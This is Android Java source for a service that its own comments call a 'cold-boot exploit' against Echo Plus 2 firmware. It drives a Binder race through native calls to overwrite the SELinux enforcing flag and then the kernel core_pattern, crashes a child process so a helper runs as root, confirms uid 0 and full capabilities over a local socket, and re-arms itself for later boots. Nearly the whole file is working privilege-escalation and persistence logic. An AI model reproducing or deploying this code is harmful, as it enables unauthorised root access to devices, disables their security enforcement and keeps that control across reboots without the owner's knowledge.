package org.local.lidar.binderprobe;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.IBinder;
import android.os.Process;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * A minimal reading path for the Plus 2 cold-boot exploit.
 *
 * This path was exercised on the checked Echo Plus 2 firmware after a
 * factory reset and an ordinary cold boot.
 * The receivers and BootAttemptGuard reserve one attempt before this service
 * starts. The exact image check lives in the receivers; the kernel addresses
 * and validation live in the native primitive. A successful native result is
 * not treated as root until the helper proves its identity over a local socket.
 */
public final class ProbeService extends Service {
    private static final String TAG = "LidarBinderProbe";
    private static final String EARLY_SOURCE = "boot-early-auto-rearm-v149";
    private static final String LATE_SOURCE = "boot-auto-rearm-v147";
    private static final String ROOT_SOCKET =
        "/data/data/org.local.lidar.binderprobe/files/root-v146.sock";

    static { System.loadLibrary("binderprobe"); }

    private static native int nativeInspectBinderProxy(long object);
    private static native int nativePendingSelfBinder(int handle);
    private static native int nativePinCpuZero();
    private static native String nativeComposeHeldPacketAfterPending(
        int handle, int expectedBinderFd, int targetMode, String executable);

    private File extractExecutable(String assetName) throws Exception {
        File executable = new File(getFilesDir(), assetName);
        try (InputStream source = getAssets().open(assetName);
             FileOutputStream target = new FileOutputStream(executable)) {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = source.read(buffer)) != -1) target.write(buffer, 0, count);
        }
        if (!executable.setExecutable(true, true))
            throw new IllegalStateException("chmod_failed");
        return executable;
    }

    private static String readSmallFile(String path) {
        try (FileInputStream input = new FileInputStream(path)) {
            byte[] data = new byte[192];
            int length = input.read(data);
            return length > 0
                ? new String(data, 0, length, StandardCharsets.UTF_8).trim()
                : "empty";
        } catch (Exception error) {
            return "unavailable:" + error.getClass().getSimpleName();
        }
    }

    /* Keep the separate Binder endpoint pending while the native primitive
     * registers and removes its two stale epoll entries. The native function
     * accepts only mode 5 (SELinux word) or mode 3 (core_pattern) here. */
    private String composeOnOwnBinder(int targetMode) {
        int pinned = nativePinCpuZero();
        if (pinned != 0) return "cpu_pin_errno_" + (-pinned);

        CountDownLatch ready = new CountDownLatch(1);
        IBinder[] remote = new IBinder[1];
        ServiceConnection connection = new ServiceConnection() {
            @Override public void onServiceConnected(ComponentName name, IBinder binder) {
                remote[0] = binder;
                ready.countDown();
            }
            @Override public void onServiceDisconnected(ComponentName name) {
                ready.countDown();
            }
        };
        if (!bindService(new Intent(this, BlockingService.class),
                         connection, BIND_AUTO_CREATE)) return "bind_failed";
        try {
            if (!ready.await(10, TimeUnit.SECONDS) || remote[0] == null)
                return "remote_unavailable";
            Field field = remote[0].getClass().getDeclaredField("mObject");
            field.setAccessible(true);
            long object = field.getLong(remote[0]);
            int handle = nativeInspectBinderProxy(object);
            File receiver = extractExecutable("probe_recvmsg64");
            int pending = handle > 0 ? nativePendingSelfBinder(handle) : -99;
            String result = pending >= 1000 && handle > 0
                ? nativeComposeHeldPacketAfterPending(handle, pending - 1000,
                                                      targetMode, receiver.getAbsolutePath())
                : "not_requested";
            return "remote_class_" + remote[0].getClass().getName()
                + "_object_0x" + Long.toHexString(object)
                + "_handle_" + handle + "_pending_" + pending
                + "_compose_" + result;
        } catch (Throwable error) {
            return "inspect_" + error.getClass().getSimpleName();
        }
        // Do not unbind on this thread: the outbound transaction still waits
        // for BlockingService, and an unrelated Binder call changes the race.
    }

    private static boolean retryable(String result) {
        return result.contains("compose_no_retained_packet_scanned_64") ||
            result.contains("compose_middle_hit_user_buffer_no_final_send_"
                + "cleanup_peek8_4f52494744415441_pop_equal_1");
    }

    private String composeWithBoundedRetries(int targetMode) {
        String result = composeOnOwnBinder(targetMode);
        int attempt = 1;
        while (attempt < 8 && retryable(result)) {
            attempt++;
            result = composeOnOwnBinder(targetMode);
        }
        return "attempts_" + attempt + "_final_" + result;
    }

    private String crashCheckedChild() {
        if (!"|/data/x".equals(readSmallFile("/proc/sys/kernel/core_pattern")))
            return "core_pipe_preflight_failed";
        try {
            File executable = extractExecutable("core_crash64");
            java.lang.Process child = new ProcessBuilder(executable.getAbsolutePath())
                .redirectErrorStream(true).start();
            byte[] output = new byte[256];
            int count = 0, received;
            while (count < output.length &&
                   (received = child.getInputStream().read(output, count,
                       output.length - count)) != -1) count += received;
            int status = child.waitFor();
            return "exit_" + status + "_"
                + new String(output, 0, count, StandardCharsets.UTF_8)
                    .trim().replace('\n', '|');
        } catch (Exception error) {
            return "exec_" + error.getClass().getSimpleName();
        }
    }

    static String askRootHelper(String request, String expected) {
        String lastError = "socket_absent";
        boolean gateCommand = "GATE_PERSIST".equals(request) ||
            "GATE_CHECK".equals(request);
        for (int attempt = 0; attempt < (gateCommand ? 2 : 24); attempt++) {
            try (LocalSocket bridge = new LocalSocket()) {
                bridge.connect(new LocalSocketAddress(ROOT_SOCKET,
                    LocalSocketAddress.Namespace.FILESYSTEM));
                bridge.setSoTimeout(gateCommand ? 25000 : 1200);
                bridge.getOutputStream().write((request + "\n")
                    .getBytes(StandardCharsets.US_ASCII));
                bridge.getOutputStream().flush();
                byte[] reply = new byte[128];
                int count = bridge.getInputStream().read(reply);
                if (count > 0) {
                    String value = new String(reply, 0, count,
                                              StandardCharsets.US_ASCII).trim();
                    return value.startsWith(expected) ? value : "unexpected_" + value;
                }
                lastError = "empty_reply";
            } catch (Exception error) {
                lastError = error.getClass().getSimpleName();
            }
            try { Thread.sleep(250); }
            catch (InterruptedException error) { return "interrupted"; }
        }
        return "unavailable_" + lastError;
    }

    private String armNextBoot() {
        File budget = new File(getFilesDir(), "autoroot_budget_v146");
        File next = new File(getFilesDir(), "autoroot_budget_v146.tmp");
        try (FileOutputStream output = new FileOutputStream(next)) {
            output.write('1');
            output.getFD().sync();
        } catch (Exception error) {
            return "write_" + error.getClass().getSimpleName();
        }
        if (!next.renameTo(budget)) return "rename_failed";
        try (java.io.FileInputStream input = new java.io.FileInputStream(budget)) {
            if (input.read() != '1' || input.read() != -1) return "readback_failed";
        } catch (Exception error) {
            return "readback_" + error.getClass().getSimpleName();
        }
        java.io.FileDescriptor directory = null;
        try {
            directory = android.system.Os.open(getFilesDir().getAbsolutePath(),
                android.system.OsConstants.O_RDONLY, 0);
            android.system.Os.fsync(directory);
        } catch (Exception error) {
            return "directory_sync_" + error.getClass().getSimpleName();
        } finally {
            if (directory != null) {
                try { android.system.Os.close(directory); }
                catch (Exception ignored) { }
            }
        }
        return "armed_one_boot";
    }

    private void runColdBoot(String source) {
        String initialEnforcing = readSmallFile("/sys/fs/selinux/enforce");

        // 1. A verified short write changes only the checked enforcing word.
        String first = composeWithBoundedRetries(5);
        String second = "stage1_not_valid";
        String crash = "not_requested";
        if (first.contains("compose_mode_5_") &&
            first.contains("_valid_1_tid_") &&
            "0".equals(readSmallFile("/sys/fs/selinux/enforce"))) {
            // 2. Repeat the primitive against the checked core_pattern word.
            second = composeWithBoundedRetries(3);
            if (second.contains("compose_mode_3_") &&
                second.contains("_valid_1_tid_"))
                // 3. Only the verified pipe target permits a child crash.
                crash = crashCheckedChild();
        }

        // 4. A write or a child exit alone is not proof of privilege. The
        // kernel-entered helper must separately report UID 0 and capabilities.
        String bridge = crash.startsWith("exit_")
            ? askRootHelper("PING", "ROOT_BRIDGE_V146 uid=0 gid=0 ")
            : "not_requested";
        String identity = bridge.startsWith("ROOT_BRIDGE_V146")
            ? askRootHelper("EXEC_ID", "EXEC_ID_V146 exit=0 output=uid=0")
            : "not_requested";
        String capabilities = bridge.startsWith("ROOT_BRIDGE_V146")
            ? askRootHelper("CAPS", "CAPS_V146 CapEff:")
            : "not_requested";
        boolean rootConfirmed = bridge.startsWith("ROOT_BRIDGE_V146 uid=0 gid=0 ")
            && identity.startsWith("EXEC_ID_V146 exit=0 output=uid=0")
            && capabilities.contains("0000003fffffffff");

        // 5. The app may reserve another single attempt only after this proof.
        String rearm = rootConfirmed ? armNextBoot() : "not_confirmed";
        String earlyGate = rootConfirmed
            ? EarlyWifiGate.releaseAfterConfirmedRoot(this) : "root_not_confirmed";
        String line = "source=" + source + " uid=" + Process.myUid()
            + " initial_enforcing=" + initialEnforcing
            + " stage1=" + first + " stage2=" + second
            + " child=" + crash + " helper=" + bridge
            + " identity=" + identity + " capabilities=" + capabilities
            + " next_boot=" + rearm + " early_gate_result=" + earlyGate + "\n";
        try (FileOutputStream output = new FileOutputStream(
                 new File(getFilesDir(), "binder-probe.log"), true)) {
            output.write(line.getBytes(StandardCharsets.UTF_8));
            output.flush();
        } catch (Exception error) {
            Log.e(TAG, "Unable to write proof log", error);
        }
        Log.i(TAG, line.trim());
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        String source = intent == null ? null : intent.getStringExtra("source");
        boolean requested = intent != null
            && intent.getBooleanExtra("self_binder_compose_selinux_canary", false)
            && intent.getBooleanExtra("self_binder_compose_two_stage", false);
        if (!requested || !(EARLY_SOURCE.equals(source) || LATE_SOURCE.equals(source))) {
            stopSelf(startId);
            return START_NOT_STICKY;
        }
        new Thread(() -> {
            try { runColdBoot(source); }
            catch (Throwable error) { Log.e(TAG, "Cold-boot attempt failed", error); }
            // Do not stop the service on the pending Binder thread.
        }, "BinderColdBoot").start();
        return START_NOT_STICKY;
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
